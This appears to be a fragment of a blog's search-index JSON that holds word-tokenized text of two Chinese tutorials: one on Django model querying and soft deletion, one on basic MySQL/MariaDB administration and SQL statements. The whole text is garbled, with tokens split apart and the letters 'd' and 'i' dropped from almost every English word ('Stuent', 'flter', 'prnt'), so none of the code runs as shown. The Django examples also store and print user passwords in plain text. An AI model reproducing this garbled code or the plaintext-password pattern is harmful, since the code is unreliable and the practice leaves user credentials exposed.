","-","+","5","rows","n","set","(","0.00","sec",")","我们","把","Bool","用户","的","ZJ","用户","的","Passwor","修改","为","：","ouytre","ef","moStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","get","(","s","_","name","=","'","ZJ","'",")","stuent",".","s","_","passwor","=","\"","ouytre","\"","stuent",".","sae","(",")","return","HttpResponse","(","\"","修改","成功","！","\"",")","查","查询","句柄","objects","，","objects","是","Manager","(",")","的","实例","，","操作","都","封装","在","了","objects","里面","，","如","Person",".","objects",".","all","(",")","，","如果","不想","使用","object","对象","，","可以","重写","Manager","(",")","方法","，","详情","见增","的","第","5点","。","object","—","—","Manager","—","—","BaseManager","—","—","get","_","queryset","class","Manager","(","BaseManager",".","from","_","queryset","(","QuerySet",")",")",":","pass","BaseManager","是","个","类","，","类","下面","有","get","_","queryset","方法","：","ef","get","_","queryset","(","self",")",":","\"","\"","\"","Returns","a","new","QuerySet","object",".","Subclasses","can","oerre","ths","metho","to","easly","customze","the","behaor","of","the","Manager",".","\"","\"","\"","return","self",".","_","queryset","_","class","(","moel","=","self",".","moel",",","usng","=","self",".","_","b",",","hnts","=","self",".","_","hnts",")","Stuent",".","objects",".","all","(",")","方法","是","调用","的","get","_","queryset","方法","：","ef","all","(","self",")",":","#","We","can","'","t","proxy","ths","metho","through","the","`","QuerySet","`","lke","we","o","for","the","#","rest","of","the","`","QuerySet","`","methos",".","Ths","s","because","`","QuerySet",".","all","(",")","`","#","works","by","creatng","a","\"","copy","\"","of","the","current","queryset","an","n","makng","sa","#","copy",",","all","the","cache","`","prefetch","_","relate","`","lookups","are","lost",".","See","the","#","mplementaton","of","`","RelateManager",".","get","_","queryset","(",")","`","for","a","better","#","unerstanng","of","how","ths","comes","nto","play",".","return","self",".","get","_","queryset","(",")","查询","方法","最后","都会","归结","到","get","_","queryset","方法","，","所以","只要","对","这个","方法","做","封装","，","就","可以","实现","定制","化","查询","，","比如","逻辑","删除","后","的","查询","。","获取","查询","结果","集","all","、","flter","、","exclue","、","orer","_","by","、","alues","、","切片","链式","调用","：","person",".","objects",".","flter","(",")",".","flter","(",")","…",".",".","exclue","(",")","…","all","返回","所有","数据","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","all","(",")","'","'","'","prnt","(","\"","数据",":","\"",",","stuents",",","\"","类型",":","\"",",","type","(","stuents",")",")","数据",":","QuerySet","[","Stuent",":","Stuent","object",",","。","。","。","。","类型",":","class","'","jango",".","b",".","moels",".","query",".","QuerySet","'","'","'","'","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","'","'","'","姓名","：","Jack","密码","：","123456789","姓名","：","Nk","密码","：","987654321","姓名","：","Rose","密码","：","abcefg","姓名","：","Bool","密码","：","pouytq","姓名","：","ZJ","密码","：","ouytre","'","'","'","return","HttpResponse","(","\"","查询","成功","\"",")","flter","过滤","操作","，","将","符合","条件","的","对象","过滤","出来","，","exclue","和","flter","相反","，","exclue","是","过滤","出","不符合","条件","的","数据","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","flter","(","pk","_","_","gt","=","3",")","#","主键","3","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","'","'","'","姓名","：","Rose","密码","：","abcefg","姓名","：","Bool","密码","：","pouytq","姓名","：","ZJ","密码","：","ouytre","'","'","'","return","HttpResponse","(","\"","查询","成功","\"",")","orer","_","by","依照","指定","的","字段","名","进行","排序","输出","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","orer","_","by","(","'","-","s","_","name","'",")","#","负号","表示","反序","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","'","'","'","姓名","：","ZJ","密码","：","ouytre","姓名","：","Rose","密码","：","abcefg","姓名","：","Nk","密码","：","987654321","姓名","：","Jack","密码","：","123456789","姓名","：","Bool","密码","：","pouytq","'","'","'","return","HttpResponse","(","\"","查询","成功","\"",")","aluesef","queStuent","(","request",")",":","stuents","_","all","=","Stuent",".","objects",".","alues","(",")","#","以","字典","的","形式","返回","for","stuents","n","stuents","_","all",":","#","把","每个","用户","字典","集中","取","出来","prnt","(","\"","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","\"",")","for","stuent","n","stuents",".","tems","(",")",":","#","把","用户","的","每个","元素","从","字典","中","取","出来","prnt","(","stuent",")","return","HttpResponse","(","\"","查询","成功","\"",")","slce","和","Python","中","的","切片","不","太","一样","QuerySet","[","5",":","15","]","获取","第","5","到","15条","数据","，","相当于","SQL","中的","Lmt","和","Offset","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","all","(",")","[","0",":","2","]","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","'","'","'","姓名","：","Jack","密码","：","123456789","姓名","：","Nk","密码","：","987654321","'","'","'","return","HttpResponse","(","\"","查询","成功","\"",")","获取","查询","条件","的","单个","对象","frst","、","last","、","get","、","exst","frst","返回","查询","集中","的","第","一个","对象","ef","queStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","last","(",")","#","返回","查询","的","最后","个","对象","prnt","(","stuent",".","s","_","name",")","return","HttpResponse","(","\"","查询","成功","\"",")","last","返回","查询","集中","的","最后","一个","对象","ef","queStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","last","(",")","#","返回","查询","的","第","一个","对象","prnt","(","stuent",".","s","_","name",")","return","HttpResponse","(","\"","查询","成功","\"",")","get","返回","一个","满足","条件","的","对象","，","如果","没有","找到","符合","条件","的","对象","，","会","引发","DoesNotExst","异常","，","如果","找到","多","个","，","会","引发","模型","MultObjectsReturne","异常","，","可以","使用","try",".",".",".","except","模型","类",".","异常",".",".",".","的","方式","捕获","异常","。","ef","queStuent","(","request",")",":","try",":","stuent","=","Stuent",".","objects",".","get","(","pk","=","11",")","prnt","(","stuent",".","s","_","name",")","except","Stuent",".","DoesNotExst",":","prnt","(","\"","用户","不存在","\"",")","except","Stuent",".","MultpleObjectsReturne",":","prnt","(","\"","存","在","多","个","用户","\"",")","return","HttpResponse","(","\"","查询","成功","\"",")","exst","判断","查询","结果","是否","存在","ef","queStuent","(","request",")",":","result","=","Stuent",".","objects",".","flter","(","s","_","name","=","'","ZJ","'",")",".","exsts","(",")","prnt","(","result",")","return","HttpResponse","(","\"","查询","成功","\"",")","查询","条件","表达式","：","属性","_","_","操作","符","=","临界值","-","gt","大于","-","lt","小于","-","gte","大于","等于","-","lte","小于","等于","-","n","在","某一","集合","中","-","contans","类似于","模糊","查询","lke","-","startswth","以","xx","开始","，","本质","也是","lke","-","enswth","以","xx","结束","，","也是","lke","-","exact","精确","等于",",","相当于","=","=","-","前面","同时","添加",",","gnore","忽略","-","exact","忽略","大小写","的","匹配","-","contans","-","startswth","-","enswth","-","snull","、","snotnull","-","jango","中","查询","条件","有","时区","问题","-","关闭","jango","中","自定义","的","时区","-","在","数据库","中","创建","对应","的","时区","表","示例","：","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","flter","(","pk","_","_","gt","=","2",")","for","stuent","n","stuents",":","prnt","(","stuent",".","s","_","name",")","return","HttpResponse","(","\"","查询","成功","\"",")","FQ","对象","F","对象","和","Q","对象","F","对象","可以","获取","我们","属性","的","值","可以","实现","一个","模型","不同","属性","的","运算","操作","还","可以","支持","算术","运算","#","可以","使用","模型","的","A","属性","与","B","属性","进行","比较","graes","=","Grae",".","objects",".","flter","(","ggrlnum","_","_","gt","=","F","(","'","gboynum","'",")",")","#","F","对象","支持","算数","运算","graes","=","Grae",".","objects",".","flter","(","ggrlnum","_","_","gt","=","F","(","'","gboynum","'",")","+","10",")","Q","对象","过滤器","的","方法","中","的","关键","参数","，","常用","于","组合","条件","对","查询","条件","进行","封装","，","封装","之后","支持","逻辑","运算","与","&","amp",";","an","或","or","非","~","not","ef","queStuent","(","request",")",":","#","查询","主键","值","在","[","2",",","4","]","之间","的","用户","stuents","=","Stuent",".","objects",".","flter","(","Q","(","pk","_","_","gte","=","2",")","&","amp",";","Q","(","pk","_","_","lte","=","4",")",")","for","stuent","n","stuents",":","prnt","(","stuent",".","s","_","name",")","return","HttpResponse","(","\"","查询","成功","\"",")","聚合","函数","使用","aggregate","(",")","函数","返回","聚合","函数","的","值","Ag","：","平均值","Count","：","数量","Max","：","最大","Mn","：","最小","Sum","：","求和","ef","queStuent","(","request",")",":","result","=","Stuent",".","objects",".","aggregate","(","Count","(","'","s","_","name","'",")",")","prnt","(","result",")","'","'","'","&","#","123",";","'","s","_","name","_","_","count","'",":","5","&","#","125",";","'","'","'","return","HttpResponse","(","\"","查询","成功","\"",")","逻辑","删除","对于","重要","数据","都","做","逻辑","删除","，","不做","物理","删除","，","实现","方法","是","定义","sDelete","属性","，","类型","为","BooleanFel","，","默认","值","为","False","。","修改","数据库","表单","class","Stuent","(","moels",".","Moel",")",":","s","_","name","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","passwor","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","grae","=","moels",".","ForegnKey","(","Grae",")","s","_","elete","=","moels",".","BooleanFel","(","efault","=","False",")","进行","文件","迁移","python","manage",".","py","makemgratonspython","manage",".","py","mgrate","先","查询","所有","项","#","查询","函数","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","flter","(","s","_","elete","=","False",")","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","return","HttpResponse","(","\"","查询","成功","\"",")","结果","姓名","：","Jack","密码","：","123456789","姓名","：","Nk","密码","：","987654321","姓名","：","Rose","密码","：","abcefg","姓名","：","Bool","密码","：","pouytq","姓名","：","ZJ","密码","：","ouytre","删除","其中","某项","#","实际上","是","把","s","_","elete","字段","修改","为","True","，","并不","是","真","的","删除","ef","moStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","get","(","s","_","name","=","'","ZJ","'",")","stuent",".","s","_","elete","=","True","stuent",".","sae","(",")","return","HttpResponse","(","\"","修改","成功","！","\"",")","再次","查询","结果","：","姓名","：","Jack","密码","：","123456789","姓名","：","Nk","密码","：","987654321","姓名","：","Rose","密码","：","abcefg","姓名","：","Bool","密码","：","pouytq","这样","做","可以","实现","对","重要","数据","不是","真","的","删除","，","但是","有","一个","缺点","，","我们","每次","查询","的","时候","，","都","需要","加上","s","_","elete","=","False","这样","一个","选项","，","能不能","有","什么","改进","的","措施","呢","？","可以","通过","自定义","Manager","实现","统一","封装","，","重","写","get","_","queryset","方法","，","这样","就","不需要","在","查询","的","时候","写","flter","(","s","_","elete","=","False",")","1","、","修改","moels",".","py","from","jango",".","b","mport","moelsclass","Grae","(","moels",".","Moel",")",":","g","_","grae","=","moels",".","CharFel","(","max","_","length","=","16",")","class","StuentManager","(","moels",".","Manager",")",":","ef","get","_","queryset","(","self",")",":","return","super","(","StuentManager",",","self",")",".","get","_","queryset","(",")",".","flter","(","s","_","elete","=","False",")","class","Stuent","(","moels",".","Moel",")",":","s","_","name","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","passwor","=","moels",".","CharFel","(","max","_","length","=","32",")","s","_","grae","=","moels",".","ForegnKey","(","Grae",")","s","_","elete","=","moels",".","BooleanFel","(","efault","=","False",")","objects","=","StuentManager","(",")","#","对","Manager","的","实例","Objects","的","get","_","qeuryset","方法","在","进行","一层","封装","2","、","这样","查询","语句","中的","s","_","elete","字段","就","可以","去掉","了","ef","queStuent","(","request",")",":","stuents","=","Stuent",".","objects",".","flter","(",")","for","stuent","n","stuents",":","prnt","(","\"","姓名","：","&","#","123",";","0","&","#","125",";","密码","：","&","#","123",";","1","&","#","125",";","\"",".","format","(","stuent",".","s","_","name",",","stuent",".","s","_","passwor",")",")","return","HttpResponse","(","\"","查询","成功","\"",")","多表","查询","·","分类","·","ForegnKey","：","一对","多","，","将","字段","定义","在","多","的","端","中","·","ManyToManyFel","：","多","对","多","，","将","字段","定义","在","两端","中","·","OneToOneFel","：","一对一","，","将","字段","定义","在","任意","一端","中","·","用","一","访问","多","·","格式","·","对象",".","模型","类","小","写","_","set","·","示例","grae",".","stuents","_","set","·","用","一","访问","一","·","格式","·","对象",".","模型","类","小","写","·","示例","·","grae",".","stuents","·","访问","·","格式","·","对象",".","属性","_","·","示例","·","stuent",".","s","_","grae","_","1","、","通过","学生","的","姓名","查询","学生","所在","的","班级","，","使用","外键","作为","连接","：","ef","queStuent","(","request",")",":","stuent","=","Stuent",".","objects",".","get","(","s","_","name","=","'","Rose","'",")","prnt","(","stuent",".","s","_","grae",".","g","_","grae",")","#","Scence","return","HttpResponse","(","\"","查询","成功","\"",")","2","、","直接","查询","ef","queStuent","(","request",")",":","grae","=","Grae",".","objects",".","get","(","stuent","_","_","s","_","name","=","'","Rose","'",")","prnt","(","grae",".","g","_","grae",")","#","Scence","return","HttpResponse","(","\"","查询","成功","\"",")","缓存","集","flter","、","exclue","、","all","都","不会","真正","的","去","查询","数据库","只有","我们","在","迭","代","结果","集","，","或者","获取","单个","对象","属性","的","时候","，","它","才","会","去","查询","数据库","懒","查询","：","为了","优化","我们","结构","和","查询"],"url":"http://ymlog.cn/2020/03/28/Django(%E4%BA%8C)%E4%B9%8BModels/","title":"Django——Models","content":"\n前期准备0、首先创建一个Django项目：\ndjango-admin startproject DoModelcd DoModeldjango-admin startapp App项目框架：---------------------...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2020-03-28 14:42:14"},{"word":["Int","初始","安装","和","创建","授权","用户","#","查看","是否","已经","安装","rpm","-","qa","marab","#","安装","mysql","和","服务端","yum","-","y","nstall","marab","-","serer","marab","#","开启","mysql","进程","systemctl","start","marab","#","初始化","mysql","，","主要","是","创建","root","用户","的","密码","，","如果","没有","这","步","，","root","密码","为","空","mysql","_","secure","_","nstallaton","#","创建","用户","create","user","'","username","'","@","'","localhost","'","IDENTIFIED","BY","'","userpassw","'",";","#","授权","用户","grant","all","prleges","on","*",".","*","to","'","username'@'localhost'",";","#","创建","用户","并","授权",",","并","授权","指定","数据库","下","所有","表",",","而","非","所有","数据库","grant","all","on","bname",".","*","to","'","username","'","@","'","localhost","'","entfe","by","'","userpassw","'",";","#","删除","用户","rop","user","'","username'@'localhost'",";","#","刷新","mysql","系统","权限","相关","表","flush","prleges",";","#","显示","当前","用户","select","user","(",")",";","#","显示","所有","用户","select","User",",","Host",",","Passwor","FROM","mysql",".","user",";","DB","_","SQL","数据库","的","库","语句","，","包括","数据库","的","创建","，","删除","，","字符集","等","。","#","查看","当前","MySQL","中","有","哪些","数据库","show","atabases",";","#","查看","选中","数据库","详情","show","create","atabase","b","_","name","\\","G","#","创建","数据库","create","atabases","b","_","name",";","#","使用","数据库","use","b","_","name",";","#","删除","数据库","rop","atabase","b","_","name",";","#","设置","字符集","create","atabase","b","_","name","efault","charset","'","utf","8","'",";","TB","_","SQL","表语","句","包括","创建","表","、","删除","表","、","查看","表","以及","定义","表","中","字段","的","属性","。","其中","定义","表","中","字段","属性","往往","比","创建","表","更","值得","研究","。","表语","句","#","首先","还是","解决","一下","创建","表","时常","见","的","字符集","问题","create","table","tableName","(",".",".",".",")","DEFAULT","CHARSET","=","utf","8","mb","4",";","#","创建","表","create","table","tb","_","name","(",".",".",".",")",";","#","查看","表","show","tables",";","show","table","status","lke","'","tb","_","name","'","\\","G","#","删除","表","rop","tables","tb","_","name",";","#","修改","表","alter","table","ol","_","name","rename","new","_","name","实例","：","MaraDB","[","emo","]","DESC","myt","7",";","+","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","+","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","Fel","Type","Null","Key","Default","Extra","+","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","+","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","nt","(","11",")","NO","PRI","NULL","auto","_","ncrement","sex","char","(","10",")","YES","man","+","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","+","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","*","NULL","：","是否","可以","存储","NULL","值","Key","：","是否","已经","编制","索引","，","PRI","表示","该","列","是","主键","的","一部分","；","UNI","表示","该","列","是","UNIQUE","索引","的","一部分","，","NULL","表示","在","列","中","某个","给定","值","允许","出现","多次","Default","：","表示","该","列","是否","有","默认值","Extra","：","获取","该","列","的","附加","信息","*","实例","查询","后","删除","表","MaraDB","[","emo","]","select","group","_","concat","(","table","_","name",")","from","nformaton","_","schema",".","tables","where","table","_","schema","=","'","emo","'",";","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","group","_","concat","(","table","_","name",")","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","fruts",",","spng",",","supplers",",","x",",","y","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","rop","tables","fruts",",","spng",",","supplers",",","x",",","y",";","字段","1","、","SQL","主键","的","六种","约束","名称","含义","PRIMARY","KEY","主键","约束","，","记录","唯一","标识","，","主键","自动","拥有","not","null","及","unque","约束","NOT","NULL","非","空","约束","，","强制","字段","有","值","UNIQUE","唯一","约束","，","该","字段","值","必须","唯一","FOREIGN","KEY","外键","，","预防","破坏","表","之间","的","连接","行为","，","防止","非法","数据","插入","外键","列","CHECK","限制","列","的","取","值","范围","DEFAULT","设置","默认值","AUTO","_","INCREMENT","自动","增加","字段","，","且","字段","类型","必须","为","整型","主键","一部分","实例","：","1","create","table","my","1","(","INT","PRIMARY","KEY","NOT","NULL","AUTO","_","INCREMENT",",","name","VARCHAR","(","20",")","NOT","NULL","UNIQUE",",","sex","char","(","2",")","NOT","NULL","DEFAULT","'","m","'",")",";","2","主键","约束","create","table","myt","3","(","name","VARCHAR","(","50",")",",","salary","FLOAT",",","PRIMARY","KEY","(","name",",","salary",")",")",";","3","外键","约束","*","外键表","：","即","当前","这","张表","主键","表","：","manTable","绑定","的","主键","：","man","_","key","_","name","绑定","的","外键","：","foregn","_","key","_","name","绑","定名","称","：","foregn","_","name","constrant","：","约束","*","constrant","(","foregn","_","name",")","foregn","key","(","foregn","_","key","_","name",")","references","manTable","(","man","_","key","_","name",")","修改","字段","语句","#","修改","字段","类型","和","字段","名","alter","table","tb","_","name","change","ol","_","fel","new","_","fel","INT","(","15",")",";","#","修改","字段","的","类型","和","字段","名","alter","table","tb","_","name","a","new","_","fel","INT","(","15",")","AFTERFIRST","fel",";","#","删除","字段","alter","table","tb","_","name","rop","fel",";","#","修改","字段","的","排列","位置","alter","table","tb","_","name","mofy","f","1","type","FIRSTAFTER","f","2",";","#","修改","字段","的","数据类型","alter","table","tb","_","name","mofy","fel","INT","(","20",")",";","#","更改","存储","引擎","alter","table","tb","_","name","engne","=","en","_","name",";","#","删除","外键","约束","alter","table","tb","_","name","rop","FOREIGN","KEY","外键","约束","名",";","#","删除","没有","关联","的","表","rop","table","IF","EXISTS","tb","1",",","tb","2",";","总结","：","change","用来","修改","KEY","本身","mofy","则","修改","KEY","的","属性","后面","直接","和","定义","语法","一样","，","千万","别","忘","了","后面","的","类型","，","如","…","INT","(","11",")","，","不然","会报","错","FIRST","：","将","字段","设置","为","表","的","第","一个","字段","AFTER","：","将","新","添加","的","字段","添加","到","指定","字段","的","后面","实例","删除","两个","有","关联","的","表","create","table","pt","(","nt","(","11",")","PRIMARY","KEY",",","name","archar","(","30",")",")",";","create","table","subt","(","nt","(","11",")","PRIMARY","KEY",",","epI","nt","(","11",")",",","CONSTRAINT","fk","_","name","FOREIGN","KEY","(","epI",")","REFERENCES","pt","(",")",")",";","*","不能","直接","rop","pt","，","但","可以","直接","删除","subt","先","解除","关联","，","再","删除","主表","*","alter","table","subt","rop","FOREIGN","KEY","fk","_","name",";","rop","table","pt",";","SQLnsert","#","两种","数值","插入","的","方式","nsert","nto","tb","_","name","(","coloumn","_","lst",")","VALUES","(","alue","_","lst",")",";","nsert","nto","tb","_","name","VALUES","(","alue","_","lst",")",";","#","将","查询","到","的","结果","插入","nsert","nto","table","1","(","coloumn","_","lst",")","select","(","coloumn","_","lst",")","from","table","2","WHERE","(","conton",")",";","for","exampleMaraDB","[","emo","]","nsert","nto","my","1","-","select",",","name",",","age","from","my","2","WHERE","2",";","upate","upate","tb","_","name","SET","column","_","name","1","=","alue","1",",","column","_","name","2","=","alue","2",",",".",".",".",".","WHERE","conton",";","elete","DELETE","from","tb","_","name","[","WHERE","conton","]",";","如果","没有","WHERE","，","则","删除","表","中","所有","记录","。","NB",".","selectselect","字段","1","，","字段","2","，","字段","3",".",".",".","-","from","[","表","1","]",",","[","表","2","]",".",".",".","数据","来源","-","WHERE","表达式","查询","的","条件","-","GROUP","BY","(","group","by","efnton",")","如何","显示","查询","数据","，","按照","指定","字段","分组","-","HAVING","(","expresson",")","[","(","operator",")","(","expresson",")","]","-","ORDER","BY","(","orer","by","efnton",")","用","什么样","的","顺序","显示","查询","的","数据","，","ASC","(","升序",")","、","DESC","(","降序",")","-","LIMIT","[","(","offset",")",",","]","(","row","count",")","限制","显示","条","数","select","&","#","123",";","字段","1","，","字段","2","，","字段","3","，",".",".",".","&","#","125",";","from","&","#","123",";","表","或","视图","&","#","125",";","WHERE","&","#","123",";","查询","条件","&","#","125",";",";","过滤",",","排序",",","分组","。","排序","要","在","过滤","之后","，","不然","报","错","数据源","#","创建","库","create","atabase","b","_","test","efault","charset","'","utf","8","'",";","#","创建","表","create","table","person","(","INT","NOT","NULL","AUTO","_","INCREMENT",",","name","CHAR","(","20",")","NOT","NULL",",","book","VARCHAR","(","50",")","NOT","NULL",",","ynasty","VARCHAR","(","10",")","DEFAULT","'","Chna","'",",","PRIMARY","KEY","(",")",")","DEFAULT","CHARSET","=","utf","8","mb","4",";","#","插入","值","nsert","nto","person","(","name",",","book",",","ynasty",")","VALUES","(","'","王阳明","'",",","'","传习","录","'",",","'","mng","'",")",";","nsert","nto","person","(","name",",","book",")","VALUES","(","'","林清","玄","'",",","'","白雪","少年","'",")",";","nsert","nto","person","(","name",",","book",",","ynasty",")","VALUES","(","'","孔子","'",",","'","论语","'",",","'","chunqu","'",")",";","nsert","nto","person","(","name",",","book",",","ynasty",")","VALUES","(","'","老子","'",",","'","道德经","'",",","'","chunqu","'",")",";","nsert","nto","person","(","name",",","book",",","ynasty",")","VALUES","(","'","李白","'",",","'","蜀道","难","'",",","'","tang","'",")",";","nsert","nto","person","(","name",",","book",",","ynasty",")","VALUES","(","'","陈子","昂","'",",","'","登","幽州","台","歌","'",",","'","tang","'",")",";","#","查看","插入","的","值","select","*","from","person",";","简单","查询","MaraDB","[","nktest","]","select",",","name",",","book",",","ynasty","from","person","where","n","(","01",",","02",",","06",")","AND","ynasty","=","'","tang","'",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","name","book","ynasty","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","6","陈子","昂","登","幽州","台","歌","tang","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","别名","查询","MaraDB","[","nktest","]","select","as","ID",",","name","as","NAME",",","book","as","BOOK",",","ynasty","as","DYNASTY","from","person","as","f","where","f",".","5",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","ID","NAME","BOOK","DYNASTY","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","1","王阳明","传习","录","mng","2","林清","玄","白雪","少年","Chna","3","孔子","论语","chunqu","4","老子","道德经","chunqu","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","即将","字段","以","别名","显示","，","同时","将","表","也","以","表明","显示","（","这里","用","的","是","f","-","person","，","所以","条件","查询","f","下","的","字段","就","可以","写成","f",".",")","排序","单列","排序","，","DESC","反序","select","DISTINCT",",","name",",","book",",","ynasty","from","person","orer","by","DESC",";","多","列","排序","，","先","按照","朝代","排序","，","相同","朝代","的","再","按照","名称","排序","select","DISTINCT",",","name",",","book",",","ynasty","from","person","orer","by","ynasty","DESC",",","name",";","分组","同类","分为","一组","，","通过","GROUP","_","CONCAT","(","fel",")","显示","详细","信息","select","group","_","concat","(","name",")",",","ynasty","from","person","group","by","ynasty",";","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","GROUP","_","CONCAT","(","name",")","ynasty","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","林清","玄","Chna","孔子",",","老子","chunqu","王阳明","mng","李白",",","陈子","昂","tang","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","过滤","查看","同一","时代","的","人","，","过滤","出","人数","1","的","select","group","_","concat","(","name",")",",","ynasty","from","person","group","by","ynasty","hang","count","(","ynasty",")","1",";","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","group","_","concat","(","name",")","ynasty","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","孔子",",","老子","chunqu","李白",",","陈子","昂","tang","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","限制","限制","显示","结果","为","offset","&","amp",";","count","select","*","from","person","lmt","2",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","name","book","ynasty","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","1","王阳明","传习","录","mng","2","林清","玄","白雪","少年","Chna","+","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","2","rows","n","set","(","0.00","sec",")","限制","显示","2个","结果","，","并","从","第","4个","开始","显示","，","这里","设置","了","偏移","位","=","4","select","*","from","person","lmt","3",",","2",";","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","name","book","ynasty","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","4","老子","道德经","chunqu","5","李白","蜀道","难","tang","+","-","-","-","-","+","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","-","-","+","-","-","-","-","-","-","-","-","-","+","AF","函数","aggregate","functon","，","mysql","内置","聚合","函数","函数","作用","AVG","(",")","列","数值","均值","COUNT","(",")","个数","，","忽略","空行",",","COUNT","(","*",")","计算","表","中","总行","数","，","不","忽略","空行","MAX","(",")","列","数值","最大","MIN","(",")","列","数值","最小","SUM","(",")","列","数值","和","实例","select",",","name",",","book",",","MAX","(","ynasty",")","from","person",";","0111","0100","0164","116","0","x","74","t","0110","0011","0143","99","0","x","63","c","0110","1101","0155","109","0","x","6","D","m","这里","t","最大","，","所以","选出","来","tang","这里","只","介绍","了","基础","的","SQL","语句","，","后面","还有","连接","查询","、","子","查询","、","合并","查询","等","…","…",".","."],"url":"http://ymlog.cn/2020/03/02/Mysql%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/","title":"Mysql常用语句","content":"Init初始安装和创建授权用户\n# 查看是否已经安装rpm -qa mariadb# 安装mysql和服务端yum -y install mariadb-server mariadb# 开启mysql进程systemctl start...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/","name":"数据库"},"date":"2020-03-02 